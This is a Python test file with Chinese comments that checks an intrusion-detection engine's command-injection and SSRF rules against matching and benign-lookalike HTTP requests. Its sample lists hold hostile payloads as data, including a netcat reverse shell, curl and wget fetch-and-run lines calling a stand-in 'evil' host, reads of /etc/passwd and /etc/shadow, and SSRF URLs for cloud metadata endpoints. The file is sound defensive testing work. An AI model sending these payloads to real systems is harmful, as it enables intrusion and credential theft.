"""命令注入 / SSRF 规则测试（v2.1，v2.4 补 cmdline 判据）。

这一组是「补能力」而不是「修漏检」，所以测试的重点和 v2.0 那批规则不同：
判据要覆盖的是**语法位置**，不是具体命令。所以真阳性侧故意换了十几种命令
（`id` / `whoami` / `cat` / `curl` / `nc` / `ls`）和五种分隔符（`;` `&&` `||`
`|` `$( )` 反引号），只要形状对就该命中；真阴性侧则放**形状像、语义不是**
的东西——广告跟踪宏 `${id}`、排序参数 `sort=name|id`、`;jsessionid=`、
被截断的 `$(id`。

v2.4 新增的 `http-cmdline-in-param` 管另一种形状：**没有分隔符，整个参数值
就是一条命令行**（`cmd=cat /etc/passwd`）。它的阴性样本来自实测——两个词表
口径的候选版本在 15.0 万条良性请求上报了 80 / 33 条误报，成因只有两个机制：
请求行末尾那个空格是**协议分隔符**（`&et=ping HTTP/1.1`），以及 `%2b` 解出的
`+` 冒充「命令名到此结束」。这两条都变成反面用例钉在这里。

SSRF 的判据是「scheme + 主机」这个组合，所以阴性侧的关键样本是
**只有主机没有 scheme** 的文本（文档、日志、示例），以及落在 RFC 1918
之外的相邻地址（`172.32.x`）。

最后一条测试是**反面断言**：扫描器 UA 指纹规则测过、也有效，但精度 0/80，
故意没上线。这种「决定不做」必须被测试守住，否则半年后有人「顺手补上」，
把一条天天刷屏的规则加回来。
"""
from __future__ import annotations

from datetime import datetime
from pathlib import Path

import pytest

from collectors.pcap import _build_event
from engine.detector import _matches, load_rules_dir

RULES = Path(__file__).parent.parent / "rules"


@pytest.fixture(scope="module")
def rules():
    return load_rules_dir(RULES)


@pytest.fixture(scope="module")
def by_id(rules):
    return {r.id: r for r in rules}


def _req(uri="/x", body="", method="GET", headers=None):
    """走**生产**的 `_build_event`，判据视图与线上同一份代码。"""
    h = {"host": "shop.internal"}
    if body:
        h["content-type"] = "application/x-www-form-urlencoded"
    h.update(headers or {})
    return _build_event(
        datetime(2026, 11, 14, 10, 0, 0),
        "203.0.113.9",
        51234,
        f"{method} {uri} HTTP/1.1".encode("utf-8"),
        h,
        body.encode("utf-8"),
    )


# ---------------------------------------------------------------- 命令注入


@pytest.mark.parametrize("uri,body,method", [
    # ③ 命令分隔符
    ("/ping?host=127.0.0.1;cat /etc/passwd", "", "GET"),
    ("/ping?host=127.0.0.1%3Bcat%20/etc/passwd", "", "GET"),   # 编码后的 ;
    ("/ping?host=1&&id", "", "GET"),                           # 逻辑与
    ("/ping?host=1%26%26id", "", "GET"),
    ("/ping?host=1||uname -a", "", "GET"),                     # 逻辑或
    ("/run?cmd=;ls -la /", "", "GET"),
    # ④ 管道
    ("/ping?host=1|whoami", "", "GET"),
    ("/ping?host=1%7Cwhoami", "", "GET"),
    ("/ping?host=1|nc -e /bin/sh 10.0.0.1 4444", "", "GET"),
    # ① 命令替换 / ② 反引号
    ("/ping?host=$(id)", "", "GET"),
    ("/ping?host=%24%28id%29", "", "GET"),
    ("/ping?host=`whoami`", "", "GET"),
    ("/ping?host=%60whoami%60", "", "GET"),
    # 命令后面带完整 URL 的典型反弹 shell
    ("/fetch?url=x;curl http://evil/s.sh|sh", "", "GET"),
    ("/fetch?url=x;wget http://evil/s -O /tmp/s", "", "GET"),
    # POST form body 里的同样形状
    ("/submit", "cmd=;cat /etc/passwd", "POST"),
    ("/submit", "host=1|id", "POST"),
])
def test_command_injection_is_caught(by_id, uri, body, method):
    ev = _req(uri, body, method)
    assert _matches(ev, by_id["http-command-injection"].match), f"应命中：{uri} {body}"


@pytest.mark.parametrize("uri,body", [
    # 广告跟踪宏：`${...}` 是模板变量，不是 shell 的 ${var}
    ("/t?${id}&${duration}&${description}", ""),
    ("/v?cb=${click_id}", ""),
    # 多字段排序：单管道后面不是命令上下文
    ("/list?sort=name|id&page=2", ""),
    ("/list?sort=name%7Cid&page=2", ""),
    # 会话 ID 用分号拼在 URL 里（Java 容器的传统写法）
    ("/app;jsessionid=ABC123DEF", ""),
    ("/a;jsessionid=1&b=2", ""),
    # `$(` 不闭合：只可能是截断文本，不是命令替换
    ("/calc?f=$(price*2", ""),
    ("/doc?t=use%20%24%28id", ""),
    # 正常单词里带分隔符字符
    ("/search?q=a|b|c", ""),
    ("/search?q=5%3C6", ""),
])
def test_benign_lookalikes_do_not_fire(by_id, uri, body):
    ev = _req(uri, body, "POST" if body else "GET")
    assert not _matches(ev, by_id["http-command-injection"].match), f"不该命中：{uri}"


def test_backtick_needs_a_leading_boundary(by_id):
    """竞价 body 里被压缩的随机字节会成对出现反引号。

    真实语料里 `...f`jw40>=5$j`nc`n=a02...` 报过一次误报，所以反引号
    要求前面是 `=&;|` 空白或括号——`host=`whoami`` 满足，随机数据不满足。
    """
    noisy = "/bid?d=f`jw40>=5$j`nc`n=a02"
    assert not _matches(_req(noisy), by_id["http-command-injection"].match)


# ---------------------------------------------------------------- SSRF


@pytest.mark.parametrize("uri", [
    # ① 云元数据
    "/fetch?url=http://169.254.169.254/latest/meta-data/",
    "/fetch?url=http://100.100.100.200/latest/meta-data/",
    "/fetch?url=http://metadata.google.internal/computeMetadata/v1/",
    "/fetch?url=https://169.254.169.254/latest/meta-data/iam/",
    # ② 环回 / 未指定 / IPv6
    "/fetch?url=http://127.0.0.1:8080/admin",
    "/fetch?url=http://127.1.2.3/",
    "/fetch?url=http://127.1:6379/",                    # inet_aton 短写
    "/fetch?url=http://127.0.1:6379/",
    "/fetch?url=http://[::ffff:127.0.0.1]:8080/",       # IPv4 映射到 IPv6
    "/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "/fetch?url=http://localhost:6379/",
    "/fetch?url=http://0.0.0.0/",
    "/fetch?url=http://[::1]:9200/_search",
    # ③ RFC 1918
    "/fetch?url=http://10.0.0.5/",
    "/fetch?url=http://192.168.10.8/",
    "/fetch?url=http://172.16.0.1/",
    "/fetch?url=http://172.31.255.254/",
    # 换个写法的同一个地址
    "/fetch?url=http://2130706433/",
    "/fetch?url=http://0x7f000001/",
    "/fetch?url=http://017700000001/",
    # 非 http scheme：gopher 打 Redis / 内网协议，file 读本地文件
    "/fetch?url=gopher://127.0.0.1:6379/_INFO",
    "/fetch?url=dict://127.0.0.1:11211/stat",
    "/read?f=file:///etc/passwd",
])
def test_ssrf_to_internal_target_is_caught(by_id, uri):
    assert _matches(_req(uri), by_id["http-ssrf-internal"].match), f"应命中：{uri}"


@pytest.mark.parametrize("uri,body", [
    # 只有主机没有 scheme —— 这是文档/日志/示例，不是「让服务器去请求它」
    ("/doc?note=connect%20to%20127.0.0.1%20on%208080", ""),
    ("/help?t=%E8%AF%B7%E8%AE%BF%E9%97%AE%20localhost%3A3000", ""),
    ("/log?msg=upstream%2010.0.0.5%20timeout", ""),
    ("/api/doc", "The metadata endpoint 169.254.169.254 returns credentials."),
    # 相邻但不在私有网段：172.32 已经出了 RFC 1918 的 172.16–31
    ("/fetch?url=http://172.32.0.1/", ""),
    ("/fetch?url=http://11.0.0.1/", ""),
    # 公网域名里带 IP 样子
    ("/fetch?url=http://10.example.com/", ""),
    ("/fetch?url=http://127.example.com/", ""),
    # scheme 有，但主机是外部的；内网地址只出现在查询参数里
    ("/fetch?url=https://example.com/?next=127.0.0.1", ""),
    ("/go?u=https://cdn.example.com/a?ip=192.168.1.1", ""),
])
def test_benign_urls_do_not_fire(by_id, uri, body):
    ev = _req(uri, body, "POST" if body else "GET")
    assert not _matches(ev, by_id["http-ssrf-internal"].match), f"不该命中：{uri}"


def test_mixed_radix_host_is_a_known_gap(by_id):
    """`0x7f.1` 这类混合进制主机**故意不认**，这是记下来的缺口，不是漏掉。

    边界划在这里的理由：`127.1`（inet_aton 短写）与 `[::ffff:127.0.0.1]`
    （IPv4 映射到 IPv6）都认了，因为它们是**同一个地址换一种写法**，正则
    能表达。混合进制（`0x7f.1` = 127.0.1）要认就得把主机拆成四段、每段
    分别按十/十六/八进制解析——那是写一个 IP 解析器，不是写判据。
    而且这个形状**只在冻结语料里出现过**，为它加判据等于拿尺子当训练集。
    """
    ev = _req("/fetch?url=http://0x7f.1:6379/")
    assert not _matches(ev, by_id["http-ssrf-internal"].match)


# ------------------------------------------- 命令注入：参数值即命令行（v2.4）

CMD = "http-cmdline-in-param"


@pytest.mark.parametrize("uri,body,method", [
    # 基准里出现过的样本（CRS 932130 / 932160 / 932236 族）
    ("/run?code=cat+%2Fetc%2Fsubuid", "", "GET"),
    ("/run?cmd=cat%20/etc/pa%5Bs%5Dswd", "", "GET"),
    ("/run?cmd=/bin/gunzip -c /var/log/something_sensitive.gz", "", "GET"),
    ("/run?args=perf --version", "", "GET"),
    ("/run?cmd=bash%20-c%20%22echo%20test%22", "", "GET"),
    # **基准里没有、但形状一样的变体**——判据描述的是形状，就该认这些
    ("/run?cmd=ls -la /", "", "GET"),                       # 短选项
    ("/run?x=nmap -sV 10.0.0.1", "", "GET"),                 # 带大写字母的选项
    ("/run?f=/usr/bin/base64 /etc/shadow", "", "GET"),       # 绝对路径前缀 + 路径参数
    ("/run?cmd=systemctl --now restart nginx", "", "GET"),   # 长选项
    ("/run?cmd=kubectl --context=prod get pods", "", "GET"),
    ("/run", "cmd=whoami -a", "POST"),                       # form body
    ("/run", "cmd=cat+%2Fetc%2Fhosts", "POST"),
])
def test_cmdline_in_param_is_caught(by_id, uri, body, method):
    ev = _req(uri, body, method)
    assert _matches(ev, by_id[CMD].match), f"应命中：{uri} {body}"


@pytest.mark.parametrize("uri,note", [
    # `=source+`：Google Fonts 的字体名。`source` 是 shell 内建，但它后面是 `Sans`
    # 不是选项/路径——v2.3 那两个词表版就是死在这里（80 条误报，61 条是这个）。
    ("/css?family=Source+Sans+Pro:300,400,600,700,900&subset=latin-ext",
     "字体名里的 source"),
    ("/s/sourcesanspro/v10/ODelI1aHBYDBqgeIAH2zlNV_2ngZ8dMf8fLgjYEouxg.woff2",
     "字体文件的 Referer 带 family=Source+..."),
    # **请求行自己的空格**：`&et=ping HTTP/1.1` 里那个空格是协议分隔符。
    # 「命令名后面是空白或行尾」这个边界在 HTTP 里恒成立，是错的边界。
    ("/cnt/?pid=445&et=ping", "请求行末尾 =ping HTTP/1.1"),
    ("/a?dr=367&ty=ex", "请求行末尾 =ex HTTP/1.1"),
    # `%2b` 解码出的 `+` 冒充「命令名到此结束」
    ("/f?P4=ID%2b9mlPqlXxeS3", "=id+ 后面是 9ml"),
    # 参数值就是命令名，后面什么都没有
    ("/complete/search?client=serp&pq=nmap&cp=5", "搜索联想词 pq=nmap"),
    ("/go?tool=cat", "参数值恰好是命令名"),
    ("/f?location=javascript%3Awindow", "javascript 里的 java"),
])
def test_cmdline_lookalikes_do_not_fire(by_id, uri, note):
    assert not _matches(_req(uri), by_id[CMD].match), f"不该命中（{note}）：{uri}"


def test_separator_form_and_cmdline_form_are_complementary(by_id):
    """两条规则管两种形状，**且不重叠**。

    `http-command-injection` 的四个分支都要求**分隔符**；`cmd=cat /etc/passwd`
    没有分隔符，只有「参数值整段是命令行」。

    重叠区也没有想象中大：`?host=1;cat /etc/passwd` 里 `=` 后面是 `1` 不是
    命令名，所以新规则**不**命中——含分隔符的形状归老规则，`param=命令行`
    的形状归新规则。如果哪天有人把新分支并进老规则，第一条断言会红；
    如果为了「多抓点」把新规则的 `[=&]` 边界放宽成「任意位置」，第二条会红。
    两种改法都会把两条已经量过误报的判据混成一条没量过的。
    """
    sep = by_id["http-command-injection"].match
    ev = _req("/run?cmd=cat /etc/passwd")
    assert not _matches(ev, sep), "没有分隔符，老规则不该命中"
    assert _matches(ev, by_id[CMD].match)

    ev2 = _req("/ping?host=1;cat /etc/passwd")
    assert _matches(ev2, sep)
    assert not _matches(ev2, by_id[CMD].match), (
        "含分隔符的形状归老规则；新规则放宽边界就会开始命中这类样本")


def test_search_query_with_flags_is_a_known_boundary(by_id):
    """搜索「命令行示例」会命中——**这是已知边界，不是 bug**。

    CIC-IDS2017 里没有搜索引擎查询，所以 15.0 万条良性请求上的 0 误报
    覆盖不到这个形状。写在这里是为了让「0 误报」这句话有边界：
    它证明的是「在 CIC 那种企业办公流量上 0 误报」，不是「在互联网上 0 误报」。
    severity 定 high 而不是 critical，也是因为这一类需要看上下文。
    """
    ev = _req("/search?q=cat -A /etc/hosts")
    assert _matches(ev, by_id[CMD].match), (
        "如果这里变成不命中，说明判据被收窄了——请同步更新 BENCHMARK §2.14 "
        "的边界段落，而不是悄悄改测试")


def test_subcommand_form_is_a_known_gap(by_id):
    """`q=docker exec -it web sh` **不命中**，这是记下来的缺口。

    判据要求命令名后面紧跟**选项或路径**；`docker exec` 这种「命令 + 子命令」
    的形态第一个 token 不是 `-` 也不是 `/`，所以不认。要认它就得引入
    「哪些是容器/编排 CLI、它们的子命令有哪些」——那是个会随上游版本变的
    词表，不是语法形状。为此漏掉的样本在 CRS 语料里没有出现，所以这笔账
    先记下不算：为没见过的形态加判据，等于拿尺子当训练集。
    """
    assert not _matches(_req("/run?q=docker exec -it web sh"), by_id[CMD].match)


# ------------------------------------------------- 决定不做的东西也要守住


def test_scanner_ua_rule_is_deliberately_not_shipped(rules):
    """扫描器 UA 指纹：判据有效，但精度 0/80，所以不默认开。

    这类「量完之后决定不做」必须有正面断言守着。否则过一阵子有人看到
    `COVERAGE` 里 `scanner` 是 `False`，顺手把规则加回来——然后在真实
    流量上天天报内网 Nmap，再被安全团队第一条关掉。
    """
    ids = {r.id for r in rules}
    assert "http-scanner-ua" not in ids, "扫描器 UA 规则不该上线（BENCHMARK §2.11）"
    assert not [r for r in rules if "scanner" in r.tags or "扫描器" in (r.name or "")]


@pytest.mark.parametrize("rule_id", [
    "http-bare-command-in-param",      # 词表宽版：+43 检出 / 80 条真误报
    "http-bare-command-narrow",        # 词表窄版：+18 检出 / 33 条真误报
    "http-windows-batch-loop",         # 语法正确，但没有 Windows 语料可证误报
])
def test_rejected_command_candidates_stay_out_of_rules(rules, rule_id):
    """三个候选判据留在 `bench/proposed/`，**故意不在 `rules/`**。

    守这条的理由和扫描器那条一样：它们的收益（CRS 上 +18 / +43 / +50）比
    上线的那条 cmdline 判据还显眼，半年后有人看到 `proposed/` 里的 YAML
    「怎么没生效」，顺手搬进 `rules/`——那就在真实流量上带进 80 条误报。
    `proposed/` 里每份文件开头都写了自己的代价，这条测试是那道闸门。
    `http-windows-batch-loop` 的情况不同：0 误报，但 CIC 是 Linux 语料，
    这个 0 只证明「不会在 Linux 流量上误报」，**不能证明「不会误报」**。
    """
    ids = {r.id for r in rules}
    assert rule_id not in ids, (
        f"{rule_id} 不该上线：结论见 bench/results/cmd_syntax_curve.md；"
        f"要翻案请先补语料（Windows/IIS）并重测误报")


def test_coverage_keeps_scanner_out_with_a_reason():
    """分母口径也要能被测试读到，且理由里要留着实测数字。"""
    import sys
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
    from bench import run_crosscheck as cc

    for cat in ("sqli", "xss", "path-traversal", "deserialization", "rce", "ssrf"):
        supported, basis = cc.COVERAGE[cat]
        assert supported is True, f"{cat} 在 v2.1 应当已进分母"
        assert basis, f"{cat} 缺依据说明"

    supported, basis = cc.COVERAGE["scanner"]
    assert supported is False
    assert "0/80" in basis, "扫描器留在分母外的理由必须带着实测精度，否则读者以为是没做"
